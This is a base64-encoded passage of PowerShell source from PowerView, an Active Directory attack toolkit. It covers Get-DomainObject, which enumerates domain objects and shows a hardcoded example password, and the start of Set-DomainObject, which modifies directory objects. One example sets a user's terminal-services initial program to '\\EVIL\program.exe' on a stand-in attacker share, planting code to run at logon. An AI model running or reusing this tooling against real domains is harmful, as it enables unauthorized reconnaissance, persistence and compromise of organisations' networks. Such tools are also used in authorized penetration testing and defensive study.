EdVSUQgKGUuZy4gNGM0MzVkZDctZGM1OC00YjE0LTlhNWUtMWZkYjBlODBkMjAxKS4KV2lsZGNhcmRzIGFjY2VwdGVkLgoKLlBBUkFNRVRFUiBEb21haW4KClNwZWNpZmllcyB0aGUgZG9tYWluIHRvIHVzZSBmb3IgdGhlIHF1ZXJ5LCBkZWZhdWx0cyB0byB0aGUgY3VycmVudCBkb21haW4uCgouUEFSQU1FVEVSIExEQVBGaWx0ZXIKClNwZWNpZmllcyBhbiBMREFQIHF1ZXJ5IHN0cmluZyB0aGF0IGlzIHVzZWQgdG8gZmlsdGVyIEFjdGl2ZSBEaXJlY3Rvcnkgb2JqZWN0cy4KCi5QQVJBTUVURVIgUHJvcGVydGllcwoKU3BlY2lmaWVzIHRoZSBwcm9wZXJ0aWVzIG9mIHRoZSBvdXRwdXQgb2JqZWN0IHRvIHJldHJpZXZlIGZyb20gdGhlIHNlcnZlci4KCi5QQVJBTUVURVIgU2VhcmNoQmFzZQoKVGhlIExEQVAgc291cmNlIHRvIHNlYXJjaCB0aHJvdWdoLCBlLmcuICJMREFQOi8vT1U9c2VjcmV0LERDPXRlc3RsYWIsREM9bG9jYWwiClVzZWZ1bCBmb3IgT1UgcXVlcmllcy4KCi5QQVJBTUVURVIgU2VydmVyCgpTcGVjaWZpZXMgYW4gQWN0aXZlIERpcmVjdG9yeSBzZXJ2ZXIgKGRvbWFpbiBjb250cm9sbGVyKSB0byBiaW5kIHRvLgoKLlBBUkFNRVRFUiBTZWFyY2hTY29wZQoKU3BlY2lmaWVzIHRoZSBzY29wZSB0byBzZWFyY2ggdW5kZXIsIEJhc2UvT25lTGV2ZWwvU3VidHJlZSAoZGVmYXVsdCBvZiBTdWJ0cmVlKS4KCi5QQVJBTUVURVIgUmVzdWx0UGFnZVNpemUKClNwZWNpZmllcyB0aGUgUGFnZVNpemUgdG8gc2V0IGZvciB0aGUgTERBUCBzZWFyY2hlciBvYmplY3QuCgouUEFSQU1FVEVSIFNlcnZlclRpbWVMaW1pdAoKU3BlY2lmaWVzIHRoZSBtYXhpbXVtIGFtb3VudCBvZiB0aW1lIHRoZSBzZXJ2ZXIgc3BlbmRzIHNlYXJjaGluZy4gRGVmYXVsdCBvZiAxMjAgc2Vjb25kcy4KCi5QQVJBTUVURVIgU2VjdXJpdHlNYXNrcwoKU3BlY2lmaWVzIGFuIG9wdGlvbiBmb3IgZXhhbWluaW5nIHNlY3VyaXR5IGluZm9ybWF0aW9uIG9mIGEgZGlyZWN0b3J5IG9iamVjdC4KT25lIG9mICdEYWNsJywgJ0dyb3VwJywgJ05vbmUnLCAnT3duZXInLCAnU2FjbCcuCgouUEFSQU1FVEVSIFRvbWJzdG9uZQoKU3dpdGNoLiBTcGVjaWZpZXMgdGhhdCB0aGUgc2VhcmNoZXIgc2hvdWxkIGFsc28gcmV0dXJuIGRlbGV0ZWQvdG9tYnN0b25lZCBvYmplY3RzLgoKLlBBUkFNRVRFUiBGaW5kT25lCgpPbmx5IHJldHVybiBvbmUgcmVzdWx0IG9iamVjdC4KCi5QQVJBTUVURVIgQ3JlZGVudGlhbAoKQSBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbF0gb2JqZWN0IG9mIGFsdGVybmF0ZSBjcmVkZW50aWFscwpmb3IgY29ubmVjdGlvbiB0byB0aGUgdGFyZ2V0IGRvbWFpbi4KCi5QQVJBTUVURVIgUmF3CgpTd2l0Y2guIFJldHVybiByYXcgcmVzdWx0cyBpbnN0ZWFkIG9mIHRyYW5zbGF0aW5nIHRoZSBmaWVsZHMgaW50byBhIGN1c3RvbSBQU09iamVjdC4KCi5FWEFNUExFCgpHZXQtRG9tYWluT2JqZWN0IC1Eb21haW4gdGVzdGxhYi5sb2NhbAoKUmV0dXJuIGFsbCBvYmplY3RzIGZvciB0aGUgdGVzdGxhYi5sb2NhbCBkb21haW4KCi5FWEFNUExFCgonUy0xLTUtMjEtODkwMTcxODU5LTM0MzM4MDkyNzktMzM2NjE5Njc1My0xMDAzJywgJ0NOPWRmbSxDTj1Vc2VycyxEQz10ZXN0bGFiLERDPWxvY2FsJywnYjZhOWEyZmItYmJkNS00ZjI4LTlhMDktMjMyMTNjZWE2NjkzJywnZGZtLmEnIHwgR2V0LURvbWFpbk9iamVjdCAtUHJvcGVydGllcyBkaXN0aW5ndWlzaGVkbmFtZQoKZGlzdGluZ3Vpc2hlZG5hbWUKLS0tLS0tLS0tLS0tLS0tLS0KQ049UFJJTUFSWSxPVT1Eb21haW4gQ29udHJvbGxlcnMsREM9dGVzdGxhYixEQz1sb2NhbApDTj1kZm0sQ049VXNlcnMsREM9dGVzdGxhYixEQz1sb2NhbApPVT1PVTMsREM9dGVzdGxhYixEQz1sb2NhbApDTj1kZm0gKGFkbWluKSxDTj1Vc2VycyxEQz10ZXN0bGFiLERDPWxvY2FsCgouRVhBTVBMRQoKJFNlY1Bhc3N3b3JkID0gQ29udmVydFRvLVNlY3VyZVN0cmluZyAnUGFzc3dvcmQxMjMhJyAtQXNQbGFpblRleHQgLUZvcmNlCiRDcmVkID0gTmV3LU9iamVjdCBTeXN0ZW0uTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbCgnVEVTVExBQlxkZm0uYScsICRTZWNQYXNzd29yZCkKR2V0LURvbWFpbk9iamVjdCAtQ3JlZGVudGlhbCAkQ3JlZCAtSWRlbnRpdHkgJ3dpbmRvd3MxJwoKLkVYQU1QTEUKCkdldC1Eb21haW4gfCBTZWxlY3QtT2JqZWN0IC1FeHBhbmQgbmFtZQp0ZXN0bGFiLmxvY2FsCgondGVzdGxhYlxoYXJtajB5JywnREVWXERvbWFpbiBBZG1pbnMnIHwgR2V0LURvbWFpbk9iamVjdCAtVmVyYm9zZSAtUHJvcGVydGllcyBkaXN0aW5ndWlzaGVkbmFtZQpWRVJCT1NFOiBbR2V0LURvbWFpblNlYXJjaGVyXSBzZWFyY2ggc3RyaW5nOiBMREFQOi8vUFJJTUFSWS50ZXN0bGFiLmxvY2FsL0RDPXRlc3RsYWIsREM9bG9jYWwKVkVSQk9TRTogW0dldC1Eb21haW5Vc2VyXSBFeHRyYWN0ZWQgZG9tYWluICd0ZXN0bGFiLmxvY2FsJyBmcm9tICd0ZXN0bGFiXGhhcm1qMHknClZFUkJPU0U6IFtHZXQtRG9tYWluU2VhcmNoZXJdIHNlYXJjaCBzdHJpbmc6IExEQVA6Ly9QUklNQVJZLnRlc3RsYWIubG9jYWwvREM9dGVzdGxhYixEQz1sb2NhbApWRVJCT1NFOiBbR2V0LURvbWFpbk9iamVjdF0gR2V0LURvbWFpbk9iamVjdCBmaWx0ZXIgc3RyaW5nOiAoJih8KHNhbUFjY291bnROYW1lPWhhcm1qMHkpKSkKCmRpc3Rpbmd1aXNoZWRuYW1lCi0tLS0tLS0tLS0tLS0tLS0tCkNOPWhhcm1qMHksQ049VXNlcnMsREM9dGVzdGxhYixEQz1sb2NhbApWRVJCT1NFOiBbR2V0LURvbWFpblVzZXJdIEV4dHJhY3RlZCBkb21haW4gJ2Rldi50ZXN0bGFiLmxvY2FsJyBmcm9tICdERVZcRG9tYWluIEFkbWlucycKVkVSQk9TRTogW0dldC1Eb21haW5TZWFyY2hlcl0gc2VhcmNoIHN0cmluZzogTERBUDovL1BSSU1BUlkudGVzdGxhYi5sb2NhbC9EQz1kZXYsREM9dGVzdGxhYixEQz1sb2NhbApWRVJCT1NFOiBbR2V0LURvbWFpbk9iamVjdF0gR2V0LURvbWFpbk9iamVjdCBmaWx0ZXIgc3RyaW5nOiAoJih8KHNhbUFjY291bnROYW1lPURvbWFpbiBBZG1pbnMpKSkKQ049RG9tYWluIEFkbWlucyxDTj1Vc2VycyxEQz1kZXYsREM9dGVzdGxhYixEQz1sb2NhbAoKLk9VVFBVVFMKClBvd2VyVmlldy5BRE9iamVjdAoKQ3VzdG9tIFBTT2JqZWN0IHdpdGggdHJhbnNsYXRlZCBBRCBvYmplY3QgcHJvcGVydHkgZmllbGRzLgoKUG93ZXJWaWV3LkFET2JqZWN0LlJhdwoKVGhlIHJhdyBEaXJlY3RvcnlTZXJ2aWNlcy5TZWFyY2hSZXN1bHQgb2JqZWN0LCBpZiAtUmF3IGlzIGVuYWJsZWQuCiM+CgogICAgW0RpYWdub3N0aWNzLkNvZGVBbmFseXNpcy5TdXBwcmVzc01lc3NhZ2VBdHRyaWJ1dGUoJ1BTVXNlRGVjbGFyZWRWYXJzTW9yZVRoYW5Bc3NpZ25tZW50cycsICcnKV0KICAgIFtPdXRwdXRUeXBlKCdQb3dlclZpZXcuQURPYmplY3QnKV0KICAgIFtPdXRwdXRUeXBlKCdQb3dlclZpZXcuQURPYmplY3QuUmF3JyldCiAgICBbQ21kbGV0QmluZGluZygpXQogICAgUGFyYW0oCiAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDAsIFZhbHVlRnJvbVBpcGVsaW5lID0gJFRydWUsIFZhbHVlRnJvbVBpcGVsaW5lQnlQcm9wZXJ0eU5hbWUgPSAkVHJ1ZSldCiAgICAgICAgW0FsaWFzKCdEaXN0aW5ndWlzaGVkTmFtZScsICdTYW1BY2NvdW50TmFtZScsICdOYW1lJywgJ01lbWJlckRpc3Rpbmd1aXNoZWROYW1lJywgJ01lbWJlck5hbWUnKV0KICAgICAgICBbU3RyaW5nW11dCiAgICAgICAgJElkZW50aXR5LAoKICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJERvbWFpbiwKCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbQWxpYXMoJ0ZpbHRlcicpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJExEQVBGaWx0ZXIsCgogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW1N0cmluZ1tdXQogICAgICAgICRQcm9wZXJ0aWVzLAoKICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtBbGlhcygnQURTUGF0aCcpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJFNlYXJjaEJhc2UsCgogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW0FsaWFzKCdEb21haW5Db250cm9sbGVyJyldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkU2VydmVyLAoKICAgICAgICBbVmFsaWRhdGVTZXQoJ0Jhc2UnLCAnT25lTGV2ZWwnLCAnU3VidHJlZScpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJFNlYXJjaFNjb3BlID0gJ1N1YnRyZWUnLAoKICAgICAgICBbVmFsaWRhdGVSYW5nZSgxLCAxMDAwMCldCiAgICAgICAgW0ludF0KICAgICAgICAkUmVzdWx0UGFnZVNpemUgPSAyMDAsCgogICAgICAgIFtWYWxpZGF0ZVJhbmdlKDEsIDEwMDAwKV0KICAgICAgICBbSW50XQogICAgICAgICRTZXJ2ZXJUaW1lTGltaXQsCgogICAgICAgIFtWYWxpZGF0ZVNldCgnRGFjbCcsICdHcm91cCcsICdOb25lJywgJ093bmVyJywgJ1NhY2wnKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRTZWN1cml0eU1hc2tzLAoKICAgICAgICBbU3dpdGNoXQogICAgICAgICRUb21ic3RvbmUsCgogICAgICAgIFtBbGlhcygnUmV0dXJuT25lJyldCiAgICAgICAgW1N3aXRjaF0KICAgICAgICAkRmluZE9uZSwKCiAgICAgICAgW01hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWxdCiAgICAgICAgW01hbmFnZW1lbnQuQXV0b21hdGlvbi5DcmVkZW50aWFsQXR0cmlidXRlKCldCiAgICAgICAgJENyZWRlbnRpYWwgPSBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbF06OkVtcHR5LAoKICAgICAgICBbU3dpdGNoXQogICAgICAgICRSYXcKICAgICkKCiAgICBCRUdJTiB7CiAgICAgICAgJFNlYXJjaGVyQXJndW1lbnRzID0gQHt9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snRG9tYWluJ10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydEb21haW4nXSA9ICREb21haW4gfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1Byb3BlcnRpZXMnXSkgeyAkU2VhcmNoZXJBcmd1bWVudHNbJ1Byb3BlcnRpZXMnXSA9ICRQcm9wZXJ0aWVzIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydTZWFyY2hCYXNlJ10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydTZWFyY2hCYXNlJ10gPSAkU2VhcmNoQmFzZSB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snU2VydmVyJ10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydTZXJ2ZXInXSA9ICRTZXJ2ZXIgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1NlYXJjaFNjb3BlJ10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydTZWFyY2hTY29wZSddID0gJFNlYXJjaFNjb3BlIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydSZXN1bHRQYWdlU2l6ZSddKSB7ICRTZWFyY2hlckFyZ3VtZW50c1snUmVzdWx0UGFnZVNpemUnXSA9ICRSZXN1bHRQYWdlU2l6ZSB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snU2VydmVyVGltZUxpbWl0J10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydTZXJ2ZXJUaW1lTGltaXQnXSA9ICRTZXJ2ZXJUaW1lTGltaXQgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1NlY3VyaXR5TWFza3MnXSkgeyAkU2VhcmNoZXJBcmd1bWVudHNbJ1NlY3VyaXR5TWFza3MnXSA9ICRTZWN1cml0eU1hc2tzIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydUb21ic3RvbmUnXSkgeyAkU2VhcmNoZXJBcmd1bWVudHNbJ1RvbWJzdG9uZSddID0gJFRvbWJzdG9uZSB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snQ3JlZGVudGlhbCddKSB7ICRTZWFyY2hlckFyZ3VtZW50c1snQ3JlZGVudGlhbCddID0gJENyZWRlbnRpYWwgfQogICAgICAgICRPYmplY3RTZWFyY2hlciA9IEdldC1Eb21haW5TZWFyY2hlciBAU2VhcmNoZXJBcmd1bWVudHMKICAgIH0KCiAgICBQUk9DRVNTIHsKICAgICAgICBpZiAoJE9iamVjdFNlYXJjaGVyKSB7CiAgICAgICAgICAgICRJZGVudGl0eUZpbHRlciA9ICcnCiAgICAgICAgICAgICRGaWx0ZXIgPSAnJwogICAgICAgICAgICAkSWRlbnRpdHkgfCBXaGVyZS1PYmplY3QgeyRffSB8IEZvckVhY2gtT2JqZWN0IHsKICAgICAgICAgICAgICAgICRJZGVudGl0eUluc3RhbmNlID0gJF8KICAgICAgICAgICAgICAgIGlmICgkSWRlbnRpdHlJbnN0YW5jZSAtbWF0Y2ggJy4rXFwuKycpIHsKICAgICAgICAgICAgICAgICAgICAkQ29udmVydGVkSWRlbnRpdHlJbnN0YW5jZSA9ICRJZGVudGl0eUluc3RhbmNlIHwgQ29udmVydC1BRE5hbWUgLU91dHB1dFR5cGUgQ2Fub25pY2FsCiAgICAgICAgICAgICAgICAgICAgaWYgKCRDb252ZXJ0ZWRJZGVudGl0eUluc3RhbmNlKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICRPYmplY3REb21haW4gPSAkQ29udmVydGVkSWRlbnRpdHlJbnN0YW5jZS5TdWJTdHJpbmcoMCwgJENvbnZlcnRlZElkZW50aXR5SW5zdGFuY2UuSW5kZXhPZignLycpKQogICAgICAgICAgICAgICAgICAgICAgICAkT2JqZWN0TmFtZSA9ICRJZGVudGl0eUluc3RhbmNlLlNwbGl0KCdcJylbMV0KICAgICAgICAgICAgICAgICAgICAgICAgJElkZW50aXR5RmlsdGVyICs9ICIoc2FtQWNjb3VudE5hbWU9JE9iamVjdE5hbWUpIgogICAgICAgICAgICAgICAgICAgICAgICAkU2VhcmNoZXJBcmd1bWVudHNbJ0RvbWFpbiddID0gJE9iamVjdERvbWFpbgogICAgICAgICAgICAgICAgICAgICAgICBXcml0ZS1WZXJib3NlICJbR2V0LURvbWFpblVzZXJdIEV4dHJhY3RlZCBkb21haW4gJyRPYmplY3REb21haW4nIGZyb20gJyRJZGVudGl0eUluc3RhbmNlJyIKICAgICAgICAgICAgICAgICAgICAgICAgJE9iamVjdFNlYXJjaGVyID0gR2V0LURvbWFpblNlYXJjaGVyIEBTZWFyY2hlckFyZ3VtZW50cwogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGVsc2UgewogICAgICAgICAgICAgICAgICAgICRJZGVudGl0eUluc3RhbmNlID0gJElkZW50aXR5SW5zdGFuY2UuUmVwbGFjZSgnKCcsICdcMjgnKS5SZXBsYWNlKCcpJywgJ1wyOScpCiAgICAgICAgICAgICAgICAgICAgaWYgKCRJZGVudGl0eUluc3RhbmNlIC1tYXRjaCAnXlMtMS0uKicpIHsKICAgICAgICAgICAgICAgICAgICAgICAgJElkZW50aXR5RmlsdGVyICs9ICIob2JqZWN0c2lkPSRJZGVudGl0eUluc3RhbmNlKSIKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgZWxzZWlmICgkSWRlbnRpdHlJbnN0YW5jZSAtbWF0Y2ggJ14oQ058T1V8REMpPS4qJykgewogICAgICAgICAgICAgICAgICAgICAgICAkSWRlbnRpdHlGaWx0ZXIgKz0gIihkaXN0aW5ndWlzaGVkbmFtZT0kSWRlbnRpdHlJbnN0YW5jZSkiCiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIGVsc2UgewogICAgICAgICAgICAgICAgICAgICAgICB0cnkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgJEd1aWRCeXRlU3RyaW5nID0gKC1Kb2luICgoW0d1aWRdJElkZW50aXR5SW5zdGFuY2UpLlRvQnl0ZUFycmF5KCkgfCBGb3JFYWNoLU9iamVjdCB7JF8uVG9TdHJpbmcoJ1gnKS5QYWRMZWZ0KDIsJzAnKX0pKSAtUmVwbGFjZSAnKC4uKScsJ1wkMScKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRJZGVudGl0eUZpbHRlciArPSAiKG9iamVjdGd1aWQ9JEd1aWRCeXRlU3RyaW5nKSIKICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICBjYXRjaCB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoJElkZW50aXR5SW5zdGFuY2UuQ29udGFpbnMoJy4nKSkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRJZGVudGl0eUZpbHRlciArPSAiKHwoc2FtQWNjb3VudE5hbWU9JElkZW50aXR5SW5zdGFuY2UpKG5hbWU9JElkZW50aXR5SW5zdGFuY2UpKGRuc2hvc3RuYW1lPSRJZGVudGl0eUluc3RhbmNlKSkiCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbHNlIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkSWRlbnRpdHlGaWx0ZXIgKz0gIih8KHNhbUFjY291bnROYW1lPSRJZGVudGl0eUluc3RhbmNlKShuYW1lPSRJZGVudGl0eUluc3RhbmNlKShkaXNwbGF5bmFtZT0kSWRlbnRpdHlJbnN0YW5jZSkpIgogICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgICAgIGlmICgkSWRlbnRpdHlGaWx0ZXIgLWFuZCAoJElkZW50aXR5RmlsdGVyLlRyaW0oKSAtbmUgJycpICkgewogICAgICAgICAgICAgICAgJEZpbHRlciArPSAiKHwkSWRlbnRpdHlGaWx0ZXIpIgogICAgICAgICAgICB9CgogICAgICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydMREFQRmlsdGVyJ10pIHsKICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIltHZXQtRG9tYWluT2JqZWN0XSBVc2luZyBhZGRpdGlvbmFsIExEQVAgZmlsdGVyOiAkTERBUEZpbHRlciIKICAgICAgICAgICAgICAgICRGaWx0ZXIgKz0gIiRMREFQRmlsdGVyIgogICAgICAgICAgICB9CgogICAgICAgICAgICBpZiAoJEZpbHRlciAtYW5kICRGaWx0ZXIgLW5lICcnKSB7CiAgICAgICAgICAgICAgICAkT2JqZWN0U2VhcmNoZXIuZmlsdGVyID0gIigmJEZpbHRlcikiCiAgICAgICAgICAgIH0KICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiW0dldC1Eb21haW5PYmplY3RdIEdldC1Eb21haW5PYmplY3QgZmlsdGVyIHN0cmluZzogJCgkT2JqZWN0U2VhcmNoZXIuZmlsdGVyKSIKCiAgICAgICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0ZpbmRPbmUnXSkgeyAkUmVzdWx0cyA9ICRPYmplY3RTZWFyY2hlci5GaW5kT25lKCkgfQogICAgICAgICAgICBlbHNlIHsgJFJlc3VsdHMgPSAkT2JqZWN0U2VhcmNoZXIuRmluZEFsbCgpIH0KICAgICAgICAgICAgJFJlc3VsdHMgfCBXaGVyZS1PYmplY3QgeyRffSB8IEZvckVhY2gtT2JqZWN0IHsKICAgICAgICAgICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1JhdyddKSB7CiAgICAgICAgICAgICAgICAgICAgIyByZXR1cm4gcmF3IHJlc3VsdCBvYmplY3RzCiAgICAgICAgICAgICAgICAgICAgJE9iamVjdCA9ICRfCiAgICAgICAgICAgICAgICAgICAgJE9iamVjdC5QU09iamVjdC5UeXBlTmFtZXMuSW5zZXJ0KDAsICdQb3dlclZpZXcuQURPYmplY3QuUmF3JykKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGVsc2UgewogICAgICAgICAgICAgICAgICAgICRPYmplY3QgPSBDb252ZXJ0LUxEQVBQcm9wZXJ0eSAtUHJvcGVydGllcyAkXy5Qcm9wZXJ0aWVzCiAgICAgICAgICAgICAgICAgICAgJE9iamVjdC5QU09iamVjdC5UeXBlTmFtZXMuSW5zZXJ0KDAsICdQb3dlclZpZXcuQURPYmplY3QnKQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgJE9iamVjdAogICAgICAgICAgICB9CiAgICAgICAgICAgIGlmICgkUmVzdWx0cykgewogICAgICAgICAgICAgICAgdHJ5IHsgJFJlc3VsdHMuZGlzcG9zZSgpIH0KICAgICAgICAgICAgICAgIGNhdGNoIHsKICAgICAgICAgICAgICAgICAgICBXcml0ZS1WZXJib3NlICJbR2V0LURvbWFpbk9iamVjdF0gRXJyb3IgZGlzcG9zaW5nIG9mIHRoZSBSZXN1bHRzIG9iamVjdDogJF8iCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICAgICAgJE9iamVjdFNlYXJjaGVyLmRpc3Bvc2UoKQogICAgICAgIH0KICAgIH0KfQoKCmZ1bmN0aW9uIFNldC1Eb21haW5PYmplY3Qgewo8IwouU1lOT1BTSVMKCk1vZGlmaWVzIGEgZ3ZlbiBwcm9wZXJ0eSBmb3IgYSBzcGVjaWZpZWQgYWN0aXZlIGRpcmVjdG9yeSBvYmplY3QuCgpBdXRob3I6IFdpbGwgU2Nocm9lZGVyIChAaGFybWoweSkgIApMaWNlbnNlOiBCU0QgMy1DbGF1c2UgIApSZXF1aXJlZCBEZXBlbmRlbmNpZXM6IEdldC1Eb21haW5PYmplY3QgIAoKLkRFU0NSSVBUSU9OCgpTcGxhdHMgdXNlci9vYmplY3QgdGFyZ2V0aW5nIHBhcmFtZXRlcnMgdG8gR2V0LURvbWFpbk9iamVjdCwgcmV0dXJuaW5nIHRoZSByYXcKc2VhcmNocmVzdWx0IG9iamVjdC4gUmV0cmlldmVzIHRoZSByYXcgZGlyZWN0b3J5ZW50cnkgZm9yIHRoZSBvYmplY3QsIGFuZCBzZXRzCmFueSB2YWx1ZXMgZnJvbSAtU2V0IEB7fSwgWE9ScyBhbnkgdmFsdWVzIGZyb20gLVhPUiBAe30sIGFuZCBjbGVhcnMgYW55IHZhbHVlcwpmcm9tIC1DbGVhciBAKCkuCgouUEFSQU1FVEVSIElkZW50aXR5CgpBIFNhbUFjY291bnROYW1lIChlLmcuIGhhcm1qMHkpLCBEaXN0aW5ndWlzaGVkTmFtZSAoZS5nLiBDTj1oYXJtajB5LENOPVVzZXJzLERDPXRlc3RsYWIsREM9bG9jYWwpLApTSUQgKGUuZy4gUy0xLTUtMjEtODkwMTcxODU5LTM0MzM4MDkyNzktMzM2NjE5Njc1My0xMTA4KSwgb3IgR1VJRCAoZS5nLiA0YzQzNWRkNy1kYzU4LTRiMTQtOWE1ZS0xZmRiMGU4MGQyMDEpLgpXaWxkY2FyZHMgYWNjZXB0ZWQuCgouUEFSQU1FVEVSIFNldAoKU3BlY2lmaWVzIHZhbHVlcyBmb3Igb25lIG9yIG1vcmUgb2JqZWN0IHByb3BlcnRpZXMgKGluIHRoZSBmb3JtIG9mIGEgaGFzaHRhYmxlKSB0aGF0IHdpbGwgcmVwbGFjZSB0aGUgY3VycmVudCB2YWx1ZXMuCgouUEFSQU1FVEVSIFhPUgoKU3BlY2lmaWVzIHZhbHVlcyBmb3Igb25lIG9yIG1vcmUgb2JqZWN0IHByb3BlcnRpZXMgKGluIHRoZSBmb3JtIG9mIGEgaGFzaHRhYmxlKSB0aGF0IHdpbGwgWE9SIHRoZSBjdXJyZW50IHZhbHVlcy4KCi5QQVJBTUVURVIgQ2xlYXIKClNwZWNpZmllcyBhbiBhcnJheSBvZiBvYmplY3QgcHJvcGVydGllcyB0aGF0IHdpbGwgYmUgY2xlYXJlZCBpbiB0aGUgZGlyZWN0b3J5LgoKLlBBUkFNRVRFUiBEb21haW4KClNwZWNpZmllcyB0aGUgZG9tYWluIHRvIHVzZSBmb3IgdGhlIHF1ZXJ5LCBkZWZhdWx0cyB0byB0aGUgY3VycmVudCBkb21haW4uCgouUEFSQU1FVEVSIExEQVBGaWx0ZXIKClNwZWNpZmllcyBhbiBMREFQIHF1ZXJ5IHN0cmluZyB0aGF0IGlzIHVzZWQgdG8gZmlsdGVyIEFjdGl2ZSBEaXJlY3Rvcnkgb2JqZWN0cy4KCi5QQVJBTUVURVIgU2VhcmNoQmFzZQoKVGhlIExEQVAgc291cmNlIHRvIHNlYXJjaCB0aHJvdWdoLCBlLmcuICJMREFQOi8vT1U9c2VjcmV0LERDPXRlc3RsYWIsREM9bG9jYWwiClVzZWZ1bCBmb3IgT1UgcXVlcmllcy4KCi5QQVJBTUVURVIgU2VydmVyCgpTcGVjaWZpZXMgYW4gQWN0aXZlIERpcmVjdG9yeSBzZXJ2ZXIgKGRvbWFpbiBjb250cm9sbGVyKSB0byBiaW5kIHRvLgoKLlBBUkFNRVRFUiBTZWFyY2hTY29wZQoKU3BlY2lmaWVzIHRoZSBzY29wZSB0byBzZWFyY2ggdW5kZXIsIEJhc2UvT25lTGV2ZWwvU3VidHJlZSAoZGVmYXVsdCBvZiBTdWJ0cmVlKS4KCi5QQVJBTUVURVIgUmVzdWx0UGFnZVNpemUKClNwZWNpZmllcyB0aGUgUGFnZVNpemUgdG8gc2V0IGZvciB0aGUgTERBUCBzZWFyY2hlciBvYmplY3QuCgouUEFSQU1FVEVSIFNlcnZlclRpbWVMaW1pdAoKU3BlY2lmaWVzIHRoZSBtYXhpbXVtIGFtb3VudCBvZiB0aW1lIHRoZSBzZXJ2ZXIgc3BlbmRzIHNlYXJjaGluZy4gRGVmYXVsdCBvZiAxMjAgc2Vjb25kcy4KCi5QQVJBTUVURVIgVG9tYnN0b25lCgpTd2l0Y2guIFNwZWNpZmllcyB0aGF0IHRoZSBzZWFyY2hlciBzaG91bGQgYWxzbyByZXR1cm4gZGVsZXRlZC90b21ic3RvbmVkIG9iamVjdHMuCgouUEFSQU1FVEVSIENyZWRlbnRpYWwKCkEgW01hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWxdIG9iamVjdCBvZiBhbHRlcm5hdGUgY3JlZGVudGlhbHMKZm9yIGNvbm5lY3Rpb24gdG8gdGhlIHRhcmdldCBkb21haW4uCgouRVhBTVBMRQoKU2V0LURvbWFpbk9iamVjdCB0ZXN0dXNlciAtU2V0IEB7J21zdHNpbml0aWFscHJvZ3JhbSc9J1xcRVZJTFxwcm9ncmFtLmV4ZSd9IC1WZXJib3NlCgpWRVJCT1NFOiBHZXQtRG9tYWluU2VhcmNoZXIgc2VhcmNoIHN0cmluZzogTERBUDovL1BSSU1BUlkudGVzdGxhYi5sb2NhbC9EQz10ZXN0bGFiLERDPWxvY2FsClZFUkJPU0U6IEdldC1Eb21haW5PYmplY3QgZmlsdGVyIHN0cmluZzogKCYofChzYW1BY2NvdW50TmFtZT10ZXN0dXNlcikpKQpWRVJCT1NFOiBTZXR0aW5nIG1zdHNpbml0